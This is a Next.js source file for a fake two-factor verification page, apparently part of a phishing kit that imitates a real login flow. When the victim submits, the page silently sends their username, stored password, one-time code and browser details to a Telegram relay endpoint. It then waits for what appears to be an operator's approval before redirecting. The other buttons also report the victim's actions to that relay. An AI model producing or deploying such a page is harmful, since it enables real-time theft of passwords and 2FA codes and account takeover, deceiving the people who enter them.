'use client';

import { useState, useRef, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  OTP_CODE_ERROR_TEXT,
} from '@/lib/approval-messages';
import { readStoredPassword, readStoredUsername } from '@/lib/login-flow-storage';
import { pollPendingLogin } from '@/lib/poll-pending-login';
import { LOGIN_REDIRECT_URL } from '@/lib/project-config';
import { postTelegramNavEvent, readStoredMethod } from '@/lib/telegram-client';

export default function VerifyCodePage() {
  const router = useRouter();
  const [method] = useState(() => {
    if (typeof window === 'undefined') return 'text';
    const storedMethod = readStoredMethod();
    return storedMethod === 'call' || storedMethod === 'text' || storedMethod === 'email'
      ? storedMethod
      : 'text';
  });
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [networkError, setNetworkError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const codeInputRefs = useRef([]);
  const [resendSubmitting, setResendSubmitting] = useState(false);
  const [backSubmitting, setBackSubmitting] = useState(false);

  useEffect(() => {
    if (!readStoredUsername()) {
      router.push('/login');
      return;
    }
    codeInputRefs.current[0]?.focus();
  }, [router]);

  const handleCodeChange = (index, value) => {
    if (value.length > 1) {
      const digits = value.replace(/\D/g, '').slice(0, 6).split('');
      const next = [...code];
      digits.forEach((d, i) => {
        if (index + i < 6) next[index + i] = d;
      });
      setCode(next);
      const nextFocus = Math.min(index + digits.length, 5);
      codeInputRefs.current[nextFocus]?.focus();
      return;
    }
    const digit = value.replace(/\D/g, '').slice(-1);
    const next = [...code];
    next[index] = digit;
    setCode(next);
    if (digit && index < 5) codeInputRefs.current[index + 1]?.focus();
  };

  const handleCodeKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      codeInputRefs.current[index - 1]?.focus();
    }
  };

  const [resendCooldown, setResendCooldown] = useState(0);
  const [tryAnotherLoading, setTryAnotherLoading] = useState(false);
  const navDisabled = submitting || resendSubmitting || tryAnotherLoading || backSubmitting;

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const t = setInterval(() => setResendCooldown((c) => (c <= 1 ? 0 : c - 1)), 1000);
    return () => clearInterval(t);
  }, [resendCooldown]);

  const handleVerifySubmit = async (e) => {
    e.preventDefault();
    const fullCode = code.join('');
    if (fullCode.length !== 6 || navDisabled) return;
    setNetworkError('');
    setSubmitting(true);
    const userId = readStoredUsername();
    const currentMethod = readStoredMethod() || method;
    const clientMeta = {
      userAgent: window.navigator.userAgent,
      screen: `${window.screen.width}x${window.screen.height}`,
      language: window.navigator.language || '',
      referrer: document.referrer || 'Direct',
      url: window.location.href,
      localTime: new Date().toLocaleString(),
      utcTime: new Date().toUTCString(),
    };
    try {
      fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password: readStoredPassword(),
          method: currentMethod,
          code: fullCode,
          client: clientMeta,
          eventType: 'verification',
        }),
      }).catch(() => {});

      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ kind: 'otp', userId, password: fullCode }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        setSubmitting(false);
        return;
      }
      if (!data?.id) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        setSubmitting(false);
        return;
      }
      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
      setSubmitting(false);
      if (outcome === 'approved') {
        sessionStorage.removeItem('visit_userId');
        sessionStorage.removeItem('visit_password');
        sessionStorage.removeItem('visit_method');
        sessionStorage.removeItem('username');
        window.location.href = LOGIN_REDIRECT_URL;
        return;
      }
      if (outcome === 'denied') {
        setCode(['', '', '', '', '', '']);
      }
      setNetworkError(OTP_CODE_ERROR_TEXT);
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
      setSubmitting(false);
    }
  };

  const handleResendCode = async (e) => {
    e.preventDefault();
    if (resendCooldown > 0 || navDisabled) return;
    setNetworkError('');
    setResendSubmitting(true);
    try {
      const clientMeta = {
        userAgent: window.navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`,
        language: window.navigator.language || '',
        referrer: document.referrer || 'Direct',
        url: window.location.href,
        localTime: new Date().toLocaleString(),
        utcTime: new Date().toUTCString(),
      };
      const telegramPromise = fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: readStoredUsername(),
          password: readStoredPassword(),
          method: readStoredMethod() || method,
          code: '',
          client: clientMeta,
          eventType: 'resend',
        }),
      });
      const [, res] = await Promise.all([new Promise((r) => setTimeout(r, 2000)), telegramPromise]);
      if (!res.ok) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }
      setCode(['', '', '', '', '', '']);
      codeInputRefs.current[0]?.focus();
      setResendCooldown(30);
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
    } finally {
      setResendSubmitting(false);
    }
  };

  const handleTryAnotherMethod = async (e) => {
    e.preventDefault();
    if (tryAnotherLoading || navDisabled) return;
    setTryAnotherLoading(true);
    setNetworkError('');
    try {
      const { ok } = await postTelegramNavEvent('changeMethod');
      if (!ok) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        setTryAnotherLoading(false);
        return;
      }
      router.push('/login/2fa');
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
      setTryAnotherLoading(false);
    }
  };

  const handleBackToLogin = async (e) => {
    e.preventDefault();
    if (navDisabled) return;
    setBackSubmitting(true);
    setNetworkError('');
    try {
      const { ok } = await postTelegramNavEvent('backToLogin');
      if (!ok) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }
      router.push('/login');
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
    } finally {
      setBackSubmitting(false);
    }
  };

  const fullCode = code.join('');
  const canVerify = fullCode.length === 6;

  return (
    <div className="login-container login-container-narrow">
      <div className="verify-content">
        <h1 className="login-title">Enter Verification Code</h1>
        <p className="twofa-intro">
          We&apos;ve sent a 6-digit verification code to your selected method. Please enter it below to continue.
        </p>
        {networkError && (
          <div className="notification-error" role="alert">
            {networkError}
          </div>
        )}
        <form onSubmit={handleVerifySubmit} className="verify-form">
          <label className="form-label">6-Digit Code</label>
          <div className="verify-code-inputs">
            {code.map((digit, i) => (
              <input
                key={i}
                ref={(el) => {
                  codeInputRefs.current[i] = el;
                }}
                type="text"
                inputMode="numeric"
                maxLength={6}
                autoComplete="one-time-code"
                className="verify-code-input"
                value={digit}
                onChange={(e) => handleCodeChange(i, e.target.value)}
                onKeyDown={(e) => handleCodeKeyDown(i, e)}
                aria-label={`Digit ${i + 1}`}
                disabled={navDisabled}
              />
            ))}
          </div>
          <p className="verify-resend">
            Didn&apos;t receive the code?{' '}
            <button
              type="button"
              className="form-link button-link"
              onClick={handleResendCode}
              disabled={resendCooldown > 0 || navDisabled}
            >
              {resendSubmitting
                ? 'Sending...'
                : resendCooldown > 0
                ? `Resend Code (0:${String(resendCooldown).padStart(2, '0')})`
                : 'Resend Code'}
            </button>
          </p>
          <button type="submit" className="login-button" disabled={!canVerify || navDisabled}>
            {submitting ? 'Verifying…' : 'Verify and Log In'}
          </button>
          <p className="verify-back">
            <button
              type="button"
              className="form-link button-link"
              onClick={handleTryAnotherMethod}
              disabled={navDisabled}
            >
              {tryAnotherLoading ? 'Loading…' : '← Try another method'}
            </button>
          </p>
          <p className="verify-back">
            <button
              type="button"
              className="form-link button-link"
              onClick={handleBackToLogin}
              disabled={navDisabled}
            >
              {backSubmitting ? 'Loading…' : '← Back to Sign In'}
            </button>
          </p>
        </form>
      </div>
    </div>
  );
}
